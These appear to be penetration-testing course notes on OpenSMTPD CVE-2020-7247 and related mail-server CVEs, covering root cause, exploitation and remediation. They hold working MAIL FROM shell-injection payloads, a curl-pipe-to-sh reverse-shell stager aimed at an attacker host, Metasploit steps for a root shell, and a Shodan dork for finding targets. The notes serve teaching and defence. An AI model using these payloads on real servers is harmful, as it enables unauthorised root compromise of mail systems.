# Latest Email Service Vulnerabilities

> HTB Academy · Attacking Common Services · Section 16 / 19

A focused look at recent high-impact email-stack CVEs. The headline case study is **OpenSMTPD CVE-2020-7247** — pre-auth RCE as root through the `MAIL FROM` envelope sender. Same conceptual pattern (untrusted input → privileged parser → command sink) reappears across mail server CVEs (Exim CVE-2019-10149, CVE-2019-15846; Exchange ProxyLogon/ProxyShell), so internalize the *shape* of the bug rather than just the payload.

---

## Quick Reference

| Item | Value |
|------|-------|
| CVE | **CVE-2020-7247** |
| Affected | OpenSMTPD ≤ 6.6.2 (regression introduced 2018, smtpd.conf default `accept from any for local`) |
| Class | Pre-auth Remote Code Execution as **root** |
| Vector | Crafted `MAIL FROM:` envelope sender (semicolon-injected shell) |
| Constraint | ≤ 64 characters total in the local-part of the sender address |
| Distros affected | Debian, Ubuntu (3rd-party), Fedora, FreeBSD, OpenBSD ≤ 6.6 |
| Fix | OpenSMTPD 6.6.2p1 / 6.6.3 — `mailaddr_match()` properly escapes input |
| Public exploit | Exploit-DB **47984** / Metasploit `exploit/unix/smtp/opensmtpd_mail_from_rce` |
| Shodan dork | `port:25 product:"OpenSMTPD"` (~5k+ exposed instances) |

---

## Root Cause in One Paragraph

`smtp_mailaddr()` in `smtp_session.c` calls `mailaddr_match()` which delegates the local-part validation to a Lua-style format string handed to `execve("/bin/sh", "-c", …)` further downstream by the local delivery agent (LDA). When the local part begins with a special character (e.g. `;`) and fails the `valid_localpart()` test, OpenSMTPD silently substitutes it with the string `"anonymous"` instead of rejecting the message — but the *original* bytes still propagate into the queue envelope. When `mda_unpriv()` later builds an MDA command line, the unsanitised semicolon-prefixed string is concatenated into a shell command, breaking out of the intended `mail.local` invocation. Result: arbitrary commands run as the OpenSMTPD privileged process (root), with no SMTP auth required.

---

## Manual Trigger (Telnet / netcat)

```bash
nc <target> 25
```

```
HELO x
MAIL FROM:<;sleep 5;>            # 64-char budget; replace with payload
RCPT TO:<root>
DATA
trigger
.
QUIT
```

Reverse-shell payload (fits in 64 chars by chaining a fetch):

```
MAIL FROM:<";sleep 2;exec sh -c 'curl 10.10.14.5/s|sh';">
```

A 2-stage approach is normal: stage 1 wgets a script (`s`), stage 2 executes it. The 64-byte cap means the *trigger* is short; the real payload lives on your HTTP server.

---

## Metasploit One-Liner

```
msf6 > use exploit/unix/smtp/opensmtpd_mail_from_rce
msf6 > set RHOSTS <ip>
msf6 > set LHOST <tun0-ip>
msf6 > set PAYLOAD cmd/unix/reverse_perl
msf6 > run
```

Returns a root shell on a vuln 6.6.2 instance in seconds.

---

## Conceptual Pattern (Source → Process → Privilege → Destination)

| Stage | What you control | What the server does | Why it matters |
|-------|------------------|----------------------|----------------|
| **Source** | The bytes you type after `MAIL FROM:` | Reads sender as untrusted input | Attacker-controlled string crosses a trust boundary |
| **Process** | A `;` inside the local part | Parser fails-open and forwards bytes to LDA | Bug = parser & sink disagree on sanitisation |
| **Privilege** | (none — pre-auth) | Listener binds 25/tcp → runs as root | Low-port services inherit root; one bug = full compromise |
| **Destination** | Outbound netcat / curl / bash | LDA `execve`s shell with attacker bytes | Your "mail" is now a syscall |

Memorise this 4-step lens — it generalises to Exim's `${run{...}}` (CVE-2019-10149), Postfix sendmail wrapper bugs, and most "header injection → command injection" CVEs.

---

## Hunting OpenSMTPD in the Wild

```bash
# Banner grab
nmap -p25 -sV --script smtp-commands <range>

# Confirm the version string
echo "QUIT" | nc <ip> 25 | head -1
# 220 host.example ESMTP OpenSMTPD
```

Look for `OpenSMTPD 6.6.2` or earlier in the banner. Many distros backport patches **without** changing the version string — verify with the package version (`dpkg -l opensmtpd`, `rpm -qa | grep opensmtpd`) when you have local access, or just fire the harmless `MAIL FROM:<;true;>` probe and see if the server accepts it (vuln) vs. `501 Bad sender` (patched).

---

## Related Recent Mail-Stack CVEs (worth name-checking in reports)

| CVE | Product | Class |
|-----|---------|-------|
| CVE-2019-10149 ("Return of the WIZard") | Exim 4.87–4.91 | Local + remote RCE via `${run{}}` in recipient |
| CVE-2019-15846 | Exim TLS SNI | Pre-auth RCE as root over TLS handshake |
| CVE-2021-26855 / 27065 (ProxyLogon) | Exchange 2013–2019 | SSRF + arbitrary file write → RCE |
| CVE-2021-34473 / 34523 / 31207 (ProxyShell) | Exchange | Pre-auth RCE chain via Autodiscover |
| CVE-2023-23397 | Outlook (Windows) | NTLM hash leak via crafted appointment reminder |
| CVE-2024-21413 (MonikerLink) | Outlook | Auth bypass / NTLM leak via `file://` link |

---

## Defenses (report's Remediation section)

- **Patch fast.** OpenSMTPD 6.6.2p1+ closes CVE-2020-7247; subscribe to oss-security and your distro security list.
- **Drop privileges.** Run the SMTP listener under a dedicated `_smtpd` user with `pledge(2)` / systemd `NoNewPrivileges=`, `ProtectSystem=strict`, `CapabilityBoundingSet=`. Even with an RCE, attacker should not land as root.
- **Egress filter mail servers.** A compromised MTA shouldn't be able to `curl` your attacker stager. Default-deny outbound to anywhere except known relays.
- **Strict input validation at the parser.** Reject any `MAIL FROM` / `RCPT TO` containing characters outside RFC 5321 (`atext`/`dot-atom`). Don't fail-open by substituting placeholders.
- **Banner / version hygiene.** Don't advertise exact build numbers; pair with WAF/IDS rules that flag `MAIL FROM:<;` patterns.
- **Centralized mail logging.** Forward smtpd logs to SIEM; alert on `mailaddr_match` denials, repeated `MAIL FROM` with non-printable bytes, or short-lived `sh` children of the smtpd process.

---

## Key Takeaways

- CVE-2020-7247 = pre-auth RCE as root, payload budget 64 bytes, two-stage curl-and-pipe is the normal way to land a shell.
- The bug is a classic **parser/sink mismatch**: validator says "no", server keeps the input anyway, MDA executes it as shell.
- Same anti-pattern repeats in Exim, Postfix, Exchange — when reviewing mail-server CVEs, always trace `untrusted MAIL FROM/RCPT TO bytes → process boundary → exec()`.
- HTB practice boxes for email-attack mechanics: **Rabbit** (OWA brute + macro phish), **SneakyMailer** (phish + IMAP loot), **Reel** (SMTP brute + RTF phish). Use [ippsec.rocks](https://ippsec.rocks) to find more.

---

## References

- NVD — [CVE-2020-7247](https://nvd.nist.gov/vuln/detail/CVE-2020-7247)
- Qualys advisory (technical write-up) — <https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt>
- Exploit-DB 47984 — <https://www.exploit-db.com/exploits/47984>
- Metasploit module — `exploit/unix/smtp/opensmtpd_mail_from_rce`
- Shodan facet — <https://www.shodan.io/search/report?query=port%3A25+product%3A%22OpenSMTPD%22>
- ippsec.rocks (search "smtp", "imap", "phish") — <https://ippsec.rocks>
- Related CVE deep dives: Exim "Return of the WIZard" CVE-2019-10149, Exchange ProxyLogon/ProxyShell
